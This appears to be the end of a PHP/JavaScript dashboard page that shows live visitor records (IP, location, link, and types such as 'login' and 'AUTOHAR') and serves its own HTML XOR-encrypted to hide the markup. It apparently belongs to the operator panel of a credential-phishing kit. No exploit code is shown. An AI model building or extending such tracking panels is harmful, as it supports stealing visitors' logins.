                ctx.arc(d.x, d.y, d.r, 0, Math.PI * 2);
                ctx.fillStyle = 'rgba(255,255,255,' + flicker + ')';
                ctx.fill();
            }
            syncDots();
            if(!realBgReady){
                realBgReady = true;
                releaseRealBootBg();
            }
            requestAnimationFrame(animate);
        }
        if(!window.__ultimaStarsLive){window.__ultimaStarsLive=1;animate();}

        var resizeTimer;
        window.addEventListener('resize', function(){
            clearTimeout(resizeTimer);
            resizeTimer = setTimeout(function(){
                resize();
                syncDots();
            }, 150);
        });
    })();
    </script>

<script>
(function(){
    var page=<?= (int)$page ?>;
    var table=document.getElementById('visitsLiveTable');
    if(!table||!window.crypto||!window.crypto.subtle)return;
    var tableBootstrapped=!!table.querySelector('tbody tr');
    // Şifre çözme paylaşımlı istemcide (window.ultimaWS) — burada handler yeter.
    function esc(value){return String(value==null?'':value).replace(/[&<>"']/g,function(ch){return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[ch];});}
    function format(value){return (parseInt(value,10)||0).toLocaleString();}
    function typeClass(value){
        var text=String(value||'link'),lower=text.toLowerCase();
        if(lower.indexOf('downloading')!==-1)return 'downloading';
        if(lower.indexOf('extension')!==-1)return 'extension';
        if(lower==='autohar')return 'AUTOHAR';
        return lower==='link'?'link':'login';
    }
    function rowHtml(row){
        var type=String(row.type||'link'),klass=typeClass(type),url=String(row.current_url||'');
        var button=url?'<button class="copy-btn" type="button" data-copy-url="'+esc(url)+'"><i class="fas fa-copy"></i></button>':'';
        return '<tr class="row-'+klass+'"><td class="ip-cell">'+esc(row.ip_address||'-')+'</td><td>'+esc(row.country||'-')+'</td><td>'+esc(row.city||'-')+'</td><td><span class="type-badge '+klass+'">'+esc(type.toUpperCase())+'</span></td><td><div class="url-cell"><span class="url-text" title="'+esc(url)+'">'+esc(url||'-')+'</span>'+button+'</div></td><td class="date-cell">'+esc(row.created_at||'-')+'</td></tr>';
    }
    // Cache (sessionStorage + cookie) kaldırıldı — sayaçlar her zaman WS'ten
    // gelen anlık veriye göre yeniden hesaplanır.
    function buildVisitsPager(){
        var viewsEl=document.getElementById('visitsLiveViews');
        var clicksEl=document.getElementById('visitsLiveLogins');
        var views=parseInt(String(viewsEl?viewsEl.textContent:'0').replace(/[^0-9]/g,''),10)||0;
        var clicks=parseInt(String(clicksEl?clicksEl.textContent:'0').replace(/[^0-9]/g,''),10)||0;
        var total=views+clicks;
        var per=15;
        var pages=Math.max(1,Math.ceil(Math.max(total,1)/per));
        var cur=page;
        if(cur>pages)cur=pages;
        var box=document.getElementById('visitsPagination');
        var label=document.getElementById('visitsPageLabel');
        if(label)label.textContent=cur+' / '+pages;
        if(!box)return;
        var html='<a href="?page='+Math.max(1,cur-1)+'" class="page-link'+(cur<=1?' disabled':'')+'"><i class="fas fa-chevron-left"></i></a>';
        var start=Math.max(1,cur-2), end=Math.min(pages,cur+2);
        if(start>1){html+='<a href="?page=1" class="page-link">1</a>';if(start>2)html+='<span class="page-link disabled">...</span>';}
        for(var i=start;i<=end;i++){html+='<a href="?page='+i+'" class="page-link'+(i===cur?' active':'')+'">'+i+'</a>';}
        if(end<pages){if(end<pages-1)html+='<span class="page-link disabled">...</span>';html+='<a href="?page='+pages+'" class="page-link">'+pages+'</a>';}
        html+='<a href="?page='+Math.min(pages,cur+1)+'" class="page-link'+(cur>=pages?' disabled':'')+'"><i class="fas fa-chevron-right"></i></a>';
        box.innerHTML=html;
    }
    function render(feed){
        if(Object.prototype.hasOwnProperty.call(feed,'views_total')){
            var views=document.getElementById('visitsLiveViews');if(views)views.textContent=format(feed.views_total);
        }
        if(Object.prototype.hasOwnProperty.call(feed,'clicks_total')){
            var logins=document.getElementById('visitsLiveLogins');if(logins)logins.textContent=format(feed.clicks_total);
        }
        if(Object.prototype.hasOwnProperty.call(feed,'views_total')||Object.prototype.hasOwnProperty.call(feed,'clicks_total')){
            buildVisitsPager();
        }
        if(!Array.isArray(feed.rows))return;
        if(tableBootstrapped){tableBootstrapped=false;return;}
        if(!feed.rows.length){table.innerHTML='<div class="empty-state"><p>No visits recorded yet</p></div>';return;}
        table.innerHTML='<div class="table-scroll"><table><thead><tr><th>IP</th><th>Country</th><th>City</th><th>Type</th><th>Link</th><th>Date</th></tr></thead><tbody>'+feed.rows.map(rowHtml).join('')+'</tbody></table></div>';
    }
    document.addEventListener('click',function(event){
        var button=event.target.closest&&event.target.closest('[data-copy-url]');
        if(!button)return;
        var url=button.getAttribute('data-copy-url')||'';
        if(typeof window.copyUrl==='function')window.copyUrl(url);
    });
    // Paylaşımlı istemcide dashboard_visits kanalına abone oluyoruz.
    function handleVisitsMessage(msg){
        if(!msg||typeof msg!=='object')return;
        if(msg.type==='dashboard_stats'&&msg.payload&&msg.payload.visit_feed)render(msg.payload.visit_feed);
    }
    // Sidebar kanalı da views + clicks totalini sidebar formülüyle atar;
    // görsel sayaç sidebar badge ile birebir tutulur.
    function handleSidebarCounts(msg){
        if(!msg||msg.type!=='sidebar_counts')return;
        var views=parseInt(msg.views,10)||0;
        var clicks=parseInt(msg.clicks,10)||0;
        var viewsEl=document.getElementById('visitsLiveViews');
        var clicksEl=document.getElementById('visitsLiveLogins');
        if(viewsEl)viewsEl.textContent=format(views);
        if(clicksEl)clicksEl.textContent=format(clicks);
        buildVisitsPager();
    }
    function subscribe(){
        if(!window.ultimaWS||typeof window.ultimaWS.subscribe!=='function'){
            setTimeout(subscribe,50);return;
        }
        // Hangi sayfayı istediğimizi bildirelim; paylaşımlı istemci
        // dashboard_visits kanalı açıkken bu sayfayı URL'ye ekler.
        if(typeof window.ultimaWS.setVisitsPage==='function')window.ultimaWS.setVisitsPage(page);
        window.ultimaWS.subscribe('dashboard_visits',handleVisitsMessage);
        window.ultimaWS.subscribe('sidebar',handleSidebarCounts);
    }
    buildVisitsPager();
    subscribe();
})();
</script></body>
</html>
<?php

if (!function_exists('ultimaXorKey')) {
    function ultimaXorKey() {
        if (empty($_SESSION['xor_page_key']) || !is_string($_SESSION['xor_page_key']) || strlen($_SESSION['xor_page_key']) < 16) {
            $_SESSION['xor_page_key'] = bin2hex(random_bytes(16));
        }
        return $_SESSION['xor_page_key'];
    }
    function ultimaXor($data, $key) {
        $n = strlen($data);
        $klen = strlen($key);
        if ($n === 0 || $klen === 0) return $data;
        return $data ^ str_repeat($key, intdiv($n, $klen)) . substr($key, 0, $n % $klen);
    }
    function ultimaXorFlush($html, $vars = []) {
        // Soft-nav (SPA) isteklerinde HTML XOR encrypted JSON olarak döner.
        // Site tasarımı düz metin olarak asla dışarı çıkmaz — client-side
        // window.__ultimaXorKey ile decrypt eder ve main.main-content'i
        // swap eder. Böylece hem şifreleme korunur hem tam reload olmaz.
        if (!empty($_SERVER['HTTP_X_SOFT_NAV'])) {
            $key = ultimaXorKey();
            $payload = base64_encode(ultimaXor($html, $key));
            if (!headers_sent()) header('Content-Type: application/json; charset=UTF-8');
            echo json_encode(['p' => $payload], JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
            return;
        }
        if (is_array($vars) && $vars) {
            extract($vars, EXTR_SKIP);
        }
        $key = ultimaXorKey();
        $payload = base64_encode(ultimaXor($html, $key));
        $keyJson = json_encode($key, JSON_UNESCAPED_SLASHES);
        $payJson = json_encode($payload, JSON_UNESCAPED_SLASHES);
        $incDir = null;
        if (!empty($dashboardIncludeDir) && is_dir($dashboardIncludeDir)) {
            $incDir = rtrim($dashboardIncludeDir, '/');
        } else {
            $try = dirname(__DIR__) . '/includes/dashboard';
            if (is_dir($try)) $incDir = $try;
        }
        $headerFile = $incDir ? $incDir . '/header.php' : '';
        $sidebarFile = $incDir ? $incDir . '/sidebar.php' : '';
        if (!isset($sidebarCollapsed) && isset($userData) && is_array($userData)) {
            $sidebarCollapsed = !empty($userData['sidebar_collapsed']);
        }
        $title = 'Dashboard';
        if (preg_match('/<title[^>]*>(.*?)<\/title>/is', $html, $tm)) {
            $title = html_entity_decode(strip_tags($tm[1]), ENT_QUOTES, 'UTF-8');
        }
        $earlyCss = '';
        if (preg_match_all('/<style\b[^>]*>.*?<\/style>/is', $html, $sm)) {
            $earlyCss .= implode('', $sm[0]);
        }
        if (preg_match_all('/<link\b[^>]*>/i', $html, $lm)) {
            foreach ($lm[0] as $tag) {
                if (preg_match('/rel\s*=\s*[\'"]stylesheet[\'"]/i', $tag) || preg_match('/rel\s*=\s*[\'"]preconnect[\'"]/i', $tag)) {
                    $earlyCss .= $tag;
                }
            }
        }
        echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>', htmlspecialchars($title, ENT_QUOTES, 'UTF-8'), '</title><link rel="icon" type="image/png" href="/images/favicon.png"><script src="https://cdn.jsdelivr.net/npm/chart.js@3.9.1/dist/chart.min.js"></script>';
        echo $earlyCss;
        echo '<style>html,body{background:#07070b;margin:0;min-height:100vh;color:#fff}#bootBg,#realBootBg{position:fixed;inset:0;width:100vw;height:100vh;pointer-events:none;z-index:0}#bootChrome{position:relative;z-index:2}#sidebar,.dock-nav,nav.dock-nav,aside.sidebar{position:fixed!important;top:0!important;left:0!important;height:100vh!important;z-index:30}</style></head><body>';
        echo '<canvas id="bootBg" aria-hidden="true"></canvas>';
        echo '<script>(function(){var K="ultimaBgDotsStateV3",c=document.getElementById("bootBg");c.style.cssText="position:fixed;inset:0;width:100vw;height:100vh;pointer-events:none;z-index:0";var x=c.getContext("2d"),w,h,d=[],m=innerWidth<768,n=window.matchMedia&&window.matchMedia("(prefers-reduced-motion: reduce)").matches,q=n?0:(m?120:220);function C(o){return{x:o.x||0,y:o.y||0,vx:typeof o.vx==="number"?o.vx:0,vy:typeof o.vy==="number"?o.vy:0,r:o.r||.6,baseAlpha:typeof o.baseAlpha==="number"?o.baseAlpha:.12,phase:typeof o.phase==="number"?o.phase:0}}function L(){try{var p=JSON.parse(sessionStorage.getItem(K)||"null");if(!p||!Array.isArray(p.d)||Date.now()-(p.t||0)>60000)return[];var sx=p.w||w,sy=p.h||h;return p.d.map(function(o){var e=C(o);if(sx&&sy){e.x=e.x/sx*w;e.y=e.y/sy*h}return e})}catch(e){return[]}}function P(){try{sessionStorage.setItem(K,JSON.stringify({t:Date.now(),w:w,h:h,d:d.slice(0,500)}))}catch(e){}}function R(){return Math.random()}function r(){w=c.width=innerWidth||1;h=c.height=innerHeight||1}function S(){window.__ultimaBgDots=d;window.__ultimaBootDots=d}r();if(q)d=L().slice(0,q);if(d.length)q=d.length;for(var i=d.length;i<q;i++)d.push({x:R()*w,y:R()*h,vx:(R()-.5)*.12,vy:(R()-.5)*.12,r:R()*.9+.35,baseAlpha:R()*.18+.06,phase:R()*Math.PI*2});S();addEventListener("pagehide",P);addEventListener("beforeunload",P);function a(){if(!document.getElementById("bootBg"))return;x.clearRect(0,0,w,h);var t=Date.now()*.001;for(var i=0;i<d.length;i++){var e=d[i];e.x+=e.vx;e.y+=e.vy;if(e.x<0)e.x=w;if(e.x>w)e.x=0;if(e.y<0)e.y=h;if(e.y>h)e.y=0;x.beginPath();x.arc(e.x,e.y,e.r,0,Math.PI*2);x.fillStyle="rgba(255,255,255,"+(Math.min(1,Math.max(0.08,e.baseAlpha+Math.sin(t*0.22+e.phase)*0.03)))+")";x.fill()}S();requestAnimationFrame(a)}if(q&&!window.__ultimaStarsLive){window.__ultimaStarsLive=1;a()}addEventListener("resize",function(){r();S()})})();</script>';
        echo '<div id="bootChrome">';
        if ($headerFile && is_file($headerFile)) {
            include $headerFile;
        }
        echo '<div class="container boot-container">';
        if ($sidebarFile && is_file($sidebarFile)) {
            $skipSidebarCounts = false;
            include $sidebarFile;
        }
        echo '<main class="main-content no-transition"></main></div></div>';
        if (session_status() === PHP_SESSION_ACTIVE) {
            session_write_close();
        }
        echo '<script>(function(){var k=', $keyJson, ',p=', $payJson, ';window.__ultimaXorKey=k;function dec(){var b=atob(p),o=new Array(b.length),kl=k.length;for(var i=0;i<b.length;i++)o[i]=String.fromCharCode(b.charCodeAt(i)^k.charCodeAt(i%kl));return o.join("")}function chrome(n){if(!n||n.nodeType!==1)return false;var id=n.id||"",tag=(n.tagName||"").toLowerCase(),cls=typeof n.className==="string"?n.className:"";if(id==="bootChrome"||id==="bootBg"||id==="realBootBg"||id==="bgCanvas"||id==="sidebar"||id==="sidebar-overlay"||id==="mobile-menu-btn"||id==="triplehookHeader")return true;if(tag==="header"||tag==="nav")return true;if(tag==="canvas"&&(id==="bootBg"||id==="realBootBg"||id==="bgCanvas"||id==="ultimaStars"))return true;if(/\b(dock-nav|mobile-dock-btn|dock-overlay|animated-bg)\b/.test(cls))return true;return false}function skipStar(tx){return /realBootBg|__ultimaStarsLive|ultimaBgDotsStateV3|bgCanvas/.test(tx||"")}function apply(h){try{var doc=new DOMParser().parseFromString(h,"text/html");document.title=doc.title||document.title;var newMain=doc.querySelector("main.main-content")||doc.querySelector("main");var curMain=document.querySelector("#bootChrome main.main-content")||document.querySelector("main");if(!newMain||!curMain){return}curMain.innerHTML=newMain.innerHTML;var b=document.body;[].slice.call(doc.body.childNodes).forEach(function(n){if(!n||n.nodeType!==1||chrome(n))return;var tag=(n.tagName||"").toLowerCase(),cls=typeof n.className==="string"?n.className:"";if(tag==="main")return;if(/\bcontainer\b/.test(cls)&&n.querySelector&&n.querySelector("main,.dock-nav,#sidebar"))return;b.appendChild(document.importNode(n,true))});var ss=[];function grab(root){if(!root)return;if(root.tagName&&root.tagName.toLowerCase()==="script"){ss.push(root);return}if(root.querySelectorAll){[].slice.call(root.querySelectorAll("script")).forEach(function(s){ss.push(s)})}}grab(curMain);[].slice.call(b.childNodes).forEach(function(n){if(n.id==="bootChrome"||n.id==="bootBg"||chrome(n))return;grab(n)});ss=ss.filter(function(s){var src=s.src||"";if(src.indexOf("chart.js")!==-1&&window.Chart)return false;return !skipStar(s.textContent||"")});ss.sort(function(a,b){return ((a.src||"")?0:1)-((b.src||"")?0:1)});var oldAEL=document.addEventListener,baseAEL=oldAEL.bind(document);document.addEventListener=function(type,fn,opts){if(type==="DOMContentLoaded"&&document.readyState!=="loading"){setTimeout(function(){try{fn.call(document,new Event("DOMContentLoaded"))}catch(e){}},0);return}return baseAEL(type,fn,opts)};(function run(i){if(i>=ss.length){document.addEventListener=oldAEL;setTimeout(function(){function bootChart(){try{var cards=document.querySelectorAll(".overview-card .chart-container,.chart-container");for(var i=0;i<cards.length;i++){var box=cards[i],cv=box.querySelector("canvas");if(!cv)continue;var w=box.clientWidth||box.offsetWidth||0,h=box.clientHeight||box.offsetHeight||235;if(w<10)w=box.parentElement?box.parentElement.clientWidth:0;if(w>10){cv.style.width=w+"px";cv.style.height=Math.max(h,220)+"px";cv.width=w;cv.height=Math.max(h,220);}if(window.Chart&&typeof Chart.getChart==="function"){var old=Chart.getChart(cv);if(old&&old.destroy)old.destroy()}}window.dispatchEvent(new Event("resize"));if(typeof OverviewChart!=="undefined"&&OverviewChart.init)OverviewChart.init();else if(typeof Dashboard!=="undefined"&&Dashboard.init)Dashboard.init()}catch(e){}}requestAnimationFrame(function(){requestAnimationFrame(bootChart)})},80);return}var old=ss[i],s=document.createElement("script");[].slice.call(old.attributes).forEach(function(a){s.setAttribute(a.name,a.value)});if(old.src){s.async=false;s.onload=s.onerror=function(){run(i+1)};}else{s.text=old.textContent}try{old.parentNode?old.parentNode.replaceChild(s,old):document.body.appendChild(s)}catch(e){}if(!old.src)run(i+1)})(0)}catch(e){}}apply(dec())})();</script></body></html>';
    }
}

ultimaXorFlush(ob_get_clean(), get_defined_vars());
